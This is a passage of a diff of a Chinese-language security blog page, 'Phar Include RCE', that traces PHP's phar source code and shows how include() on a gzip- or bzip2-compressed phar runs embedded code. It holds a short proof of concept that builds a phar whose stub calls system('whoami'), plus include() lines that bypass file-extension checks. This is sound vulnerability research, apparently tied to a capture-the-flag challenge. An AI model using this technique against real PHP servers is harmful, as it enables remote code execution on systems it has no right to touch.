php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\", ext/zlib is buggy in PHP versions older than 5.2.6\") } php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\" to temporary file\") } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_GZ; /* now, start over */ test = '\\0'; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\"\"); break; } continue; } else if (!memcmp(pos, bz_magic, 3)) { php_stream_filter *filter; php_stream *temp; if (!PHAR_G(has_bz2)) { MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\" to temporary file, enable bz2 extension in php.ini\") } /* entire file is bzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\"unable to create temporary file for decompression of bzipped phar archive \\\"%s\\\"\") } php_stream_rewind(fp); filter = php_stream_filter_create(\"bzip2.decompress\", NULL, php_stream_is_persistent(fp)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\", filter creation failed\") } php_stream_filter_append(\u0026temp-\u003ewritefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\" to temporary file\") } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_BZ2; /* now, start over */ test = '\\0'; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\"\"); break; } continue; } if (!memcmp(pos, zip_magic, 4)) { php_stream_seek(fp, 0, SEEK_END); return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error); } if (got \u003e= 512) { if (phar_is_tar(pos, fname)) { php_stream_rewind(fp); return phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error); } } } if (got \u003e 0 \u0026\u0026 (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) { halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */ return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error); } halt_offset += got; memmove(buffer, buffer + window_size, tokenlen); /* move the memory buffer by the size of the window */ } MAPPHAR_ALLOC_FAIL(\"internal corruption of phar \\\"%s\\\" (__HALT_COMPILER(); not found)\") } /* }}} */ 简单来说这个函数负责打开一个可能是 PHAR 的文件流，根据文件头来识别它的格式（PHAR、ZIP、TAR、GZ、BZ2），并进行相应的解压和解析，比如文件格式是GZ，就会先进行解压获取其中的phar文件，再进行解析\n利用phar压缩包实现RCE 根据这个特性，可以实现上传不包含php代码的文件实现RCE，一个简单的poc：\n\u003c?php $phar = new Phar('exploit.phar'); $phar-\u003estartBuffering(); $stub = \u003c\u003c\u003c'STUB' \u003c?php system('whoami'); __HALT_COMPILER(); ?\u003e STUB; $phar-\u003esetStub($stub); $phar-\u003eaddFromString('test.txt', 'test'); $phar-\u003estopBuffering(); ?\u003e tar和phar都有php明文代码，没必要专门打包一个tar文件，所以选择直接include这个phar文件或压缩文件都可以实现RCE，利用了.phar文件名实现了解压：\ninclude(\"exploit.phar.gz\"); // gzip exploit.phar include(\"exploit.phar.bz2\"); // bzip2 exploit.phar 比较奇怪为什么zip没有成功，只能用伪协议，当然gz和bzip2也能用伪协议：\ninclude(\"zip://exploit.phar.zip#exploit.phar\"); include(\"compress.zlib://exploit.phar.gz\"); include(\"compress.bzip2://exploit.phar.bz2\"); 之前也提到是根据文件头来识别压缩文件的，所以说即使后缀不为.gz .bz2也是可以实现解压的，可以用于绕过后缀名的检验，只要文件是相应压缩包格式即可\n参考资料：\nhttps://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/\n",
+  "wordCount" : "1705",
+  "inLanguage": "en",
+  "datePublished": "2025-08-20T00:00:00Z",
+  "dateModified": "2025-08-20T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/web/pharinclude/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Phar Include RCE
+    </h1>
+    <div class="post-meta"><span title='2025-08-20 00:00:00 +0000 UTC'>August 20, 2025</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#include%e5%ba%95%e5%b1%82%e9%80%bb%e8%be%91" aria-label="Include底层逻辑">Include底层逻辑</a></li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8phar%e5%8e%8b%e7%bc%a9%e5%8c%85%e5%ae%9e%e7%8e%b0rce" aria-label="利用phar压缩包实现RCE">利用phar压缩包实现RCE</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h2 id="include底层逻辑">Include底层逻辑<a hidden class="anchor" aria-hidden="true" href="#include底层逻辑">#</a></h2>
+<p>在调用<code>include() 时会调用 Zend 引擎中的</code>compile_filename()<code>，根据文件路径（filename）将文件编译为 zend_op_array，并返回该操作数数组。文件路径的处理、是否已加载缓存、是否需要重新编译等都会由 </code>compile_filename()` 来决定</p>
+<pre tabindex="0"><code>zend_op_array *compile_filename(int type, zend_string *filename)
 {
 	zend_file_handle file_handle;
 	zend_op_array *retval;
@@ -24,327 +343,417 @@
 
 	return retval;
 }
-</code></pre><p><code>zend_compile_file</code>是一个函数指针，对于phar：</p><pre tabindex=0><code>zend_compile_file = phar_compile_file;
-</code></pre><p>phar_compile_file：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> zend_op_array <span style=color:#f92672>*</span><span style=color:#a6e22e>phar_compile_file</span>(zend_file_handle <span style=color:#f92672>*</span>file_handle, <span style=color:#66d9ef>int</span> type) <span style=color:#75715e>/* </span>{{{ <span style=color:#960050;background-color:#1e0010>*/</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>	zend_op_array <span style=color:#f92672>*</span>res;
-</span></span><span style=display:flex><span>	zend_string <span style=color:#f92672>*</span>name <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> failed;
-</span></span><span style=display:flex><span>	phar_archive_data <span style=color:#f92672>*</span>phar;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>file_handle <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>file_handle<span style=color:#f92672>-&gt;</span>filename) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>phar_orig_compile_file</span>(file_handle, type);
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strstr</span>(<span style=color:#a6e22e>ZSTR_VAL</span>(file_handle<span style=color:#f92672>-&gt;</span>filename), <span style=color:#e6db74>&#34;.phar&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>strstr</span>(<span style=color:#a6e22e>ZSTR_VAL</span>(file_handle<span style=color:#f92672>-&gt;</span>filename), <span style=color:#e6db74>&#34;://&#34;</span>)) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (SUCCESS <span style=color:#f92672>==</span> <span style=color:#a6e22e>phar_open_from_filename</span>(<span style=color:#a6e22e>ZSTR_VAL</span>(file_handle<span style=color:#f92672>-&gt;</span>filename), <span style=color:#a6e22e>ZSTR_LEN</span>(file_handle<span style=color:#f92672>-&gt;</span>filename), NULL, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>phar, NULL)) {
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (phar<span style=color:#f92672>-&gt;</span>is_zip <span style=color:#f92672>||</span> phar<span style=color:#f92672>-&gt;</span>is_tar) {
-</span></span><span style=display:flex><span>				zend_file_handle f;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* zip or tar-based phar */</span>
-</span></span><span style=display:flex><span>				name <span style=color:#f92672>=</span> <span style=color:#a6e22e>zend_strpprintf</span>(<span style=color:#ae81ff>4096</span>, <span style=color:#e6db74>&#34;phar://%s/%s&#34;</span>, <span style=color:#a6e22e>ZSTR_VAL</span>(file_handle<span style=color:#f92672>-&gt;</span>filename), <span style=color:#e6db74>&#34;.phar/stub.php&#34;</span>);
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>zend_stream_init_filename_ex</span>(<span style=color:#f92672>&amp;</span>f, name);
-</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> (SUCCESS <span style=color:#f92672>==</span> <span style=color:#a6e22e>zend_stream_open_function</span>(<span style=color:#f92672>&amp;</span>f)) {
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>zend_string_release</span>(f.filename);
-</span></span><span style=display:flex><span>					f.filename <span style=color:#f92672>=</span> file_handle<span style=color:#f92672>-&gt;</span>filename;
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> (f.opened_path) {
-</span></span><span style=display:flex><span>						<span style=color:#a6e22e>zend_string_release</span>(f.opened_path);
-</span></span><span style=display:flex><span>					}
-</span></span><span style=display:flex><span>					f.opened_path <span style=color:#f92672>=</span> file_handle<span style=color:#f92672>-&gt;</span>opened_path;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>					<span style=color:#66d9ef>switch</span> (file_handle<span style=color:#f92672>-&gt;</span>type) {
-</span></span><span style=display:flex><span>						<span style=color:#66d9ef>case</span> ZEND_HANDLE_STREAM:
-</span></span><span style=display:flex><span>							<span style=color:#66d9ef>if</span> (file_handle<span style=color:#f92672>-&gt;</span>handle.stream.closer <span style=color:#f92672>&amp;&amp;</span> file_handle<span style=color:#f92672>-&gt;</span>handle.stream.handle) {
-</span></span><span style=display:flex><span>								file_handle<span style=color:#f92672>-&gt;</span>handle.stream.<span style=color:#a6e22e>closer</span>(file_handle<span style=color:#f92672>-&gt;</span>handle.stream.handle);
-</span></span><span style=display:flex><span>							}
-</span></span><span style=display:flex><span>							file_handle<span style=color:#f92672>-&gt;</span>handle.stream.handle <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>						<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
-</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>					}
-</span></span><span style=display:flex><span>					<span style=color:#f92672>*</span>file_handle <span style=color:#f92672>=</span> f;
-</span></span><span style=display:flex><span>				}
-</span></span><span style=display:flex><span>			} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (phar<span style=color:#f92672>-&gt;</span>flags <span style=color:#f92672>&amp;</span> PHAR_FILE_COMPRESSION_MASK) {
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* compressed phar */</span>
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>type <span style=color:#f92672>=</span> ZEND_HANDLE_STREAM;
-</span></span><span style=display:flex><span>				<span style=color:#75715e>/* we do our own reading directly from the phar, don&#39;t change the next line */</span>
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>handle.stream.handle  <span style=color:#f92672>=</span> phar;
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>handle.stream.reader  <span style=color:#f92672>=</span> phar_zend_stream_reader;
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>handle.stream.closer  <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>handle.stream.fsizer  <span style=color:#f92672>=</span> phar_zend_stream_fsizer;
-</span></span><span style=display:flex><span>				file_handle<span style=color:#f92672>-&gt;</span>handle.stream.isatty  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>				phar<span style=color:#f92672>-&gt;</span>is_persistent <span style=color:#f92672>?</span>
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_rewind</span>(<span style=color:#a6e22e>PHAR_G</span>(cached_fp)[phar<span style=color:#f92672>-&gt;</span>phar_pos].fp) <span style=color:#f92672>:</span>
-</span></span><span style=display:flex><span>					<span style=color:#a6e22e>php_stream_rewind</span>(phar<span style=color:#f92672>-&gt;</span>fp);
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	zend_try {
-</span></span><span style=display:flex><span>		failed <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>CG</span>(zend_lineno) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>		res <span style=color:#f92672>=</span> <span style=color:#a6e22e>phar_orig_compile_file</span>(file_handle, type);
-</span></span><span style=display:flex><span>	} zend_catch {
-</span></span><span style=display:flex><span>		failed <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>		res <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	} <span style=color:#a6e22e>zend_end_try</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (name) {
-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>zend_string_release</span>(name);
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (failed) {
-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>zend_bailout</span>();
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> res;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span><span style=color:#75715e>/* }}} */</span>
-</span></span></code></pre></div><p>只要文件名中包含<code>.phar</code>且不含<code>://</code>就会调用phar_open_from_filename：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>phar_open_from_filename</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>fname, <span style=color:#66d9ef>size_t</span> fname_len, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>alias, <span style=color:#66d9ef>size_t</span> alias_len, <span style=color:#66d9ef>uint32_t</span> options, phar_archive_data<span style=color:#f92672>**</span> pphar, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>error) <span style=color:#75715e>/* </span>{{{ <span style=color:#960050;background-color:#1e0010>*/</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>	php_stream <span style=color:#f92672>*</span>fp;
-</span></span><span style=display:flex><span>	zend_string <span style=color:#f92672>*</span>actual;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> ret, is_data <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (error) {
-</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>error <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>strstr</span>(fname, <span style=color:#e6db74>&#34;.phar&#34;</span>)) {
-</span></span><span style=display:flex><span>		is_data <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>phar_open_parsed_phar</span>(fname, fname_len, alias, alias_len, is_data, options, pphar, error) <span style=color:#f92672>==</span> SUCCESS) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> SUCCESS;
-</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (error <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>*</span>error) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FAILURE;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>php_check_open_basedir</span>(fname)) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FAILURE;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	fp <span style=color:#f92672>=</span> <span style=color:#a6e22e>php_stream_open_wrapper</span>(fname, <span style=color:#e6db74>&#34;rb&#34;</span>, IGNORE_URL<span style=color:#f92672>|</span>STREAM_MUST_SEEK, <span style=color:#f92672>&amp;</span>actual);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>fp) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (options <span style=color:#f92672>&amp;</span> REPORT_ERRORS) {
-</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (error) {
-</span></span><span style=display:flex><span>				<span style=color:#a6e22e>spprintf</span>(error, <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;unable to open phar for reading </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>, fname);
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (actual) {
-</span></span><span style=display:flex><span>			<span style=color:#a6e22e>zend_string_release_ex</span>(actual, <span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>		}
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FAILURE;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (actual) {
-</span></span><span style=display:flex><span>		fname <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZSTR_VAL</span>(actual);
-</span></span><span style=display:flex><span>		fname_len <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZSTR_LEN</span>(actual);
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span>  <span style=color:#a6e22e>phar_open_from_fp</span>(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (actual) {
-</span></span><span style=display:flex><span>		<span style=color:#a6e22e>zend_string_release_ex</span>(actual, <span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> ret;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span><span style=color:#75715e>/* }}}*/</span>
-</span></span></code></pre></div><p>phar_open_from_fp：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>phar_open_from_fp</span>(php_stream<span style=color:#f92672>*</span> fp, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>fname, <span style=color:#66d9ef>size_t</span> fname_len, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>alias, <span style=color:#66d9ef>size_t</span> alias_len, <span style=color:#66d9ef>uint32_t</span> options, phar_archive_data<span style=color:#f92672>**</span> pphar, <span style=color:#66d9ef>int</span> is_data, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>error) <span style=color:#75715e>/* </span>{{{ <span style=color:#960050;background-color:#1e0010>*/</span>
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> token[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;__HALT_COMPILER();&#34;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> zip_magic[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;PK</span><span style=color:#ae81ff>\x03\x04</span><span style=color:#e6db74>&#34;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> gz_magic[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1f\x8b\x08</span><span style=color:#e6db74>&#34;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> bz_magic[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;BZh&#34;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pos, test <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> recursion_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>; <span style=color:#75715e>// arbitrary limit to avoid too deep or even infinite recursion
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int</span> window_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1024</span>;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>1024</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>sizeof</span>(token)]; <span style=color:#75715e>/* a 1024 byte window + the size of the halt_compiler token (moving window) */</span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> zend_long readsize <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(buffer) <span style=color:#f92672>-</span> <span style=color:#66d9ef>sizeof</span>(token);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> zend_long tokenlen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(token) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>	zend_long halt_offset;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>size_t</span> got;
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint32_t</span> compression <span style=color:#f92672>=</span> PHAR_FILE_COMPRESSED_NONE;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (error) {
-</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>error <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>==</span> <span style=color:#a6e22e>php_stream_rewind</span>(fp)) {
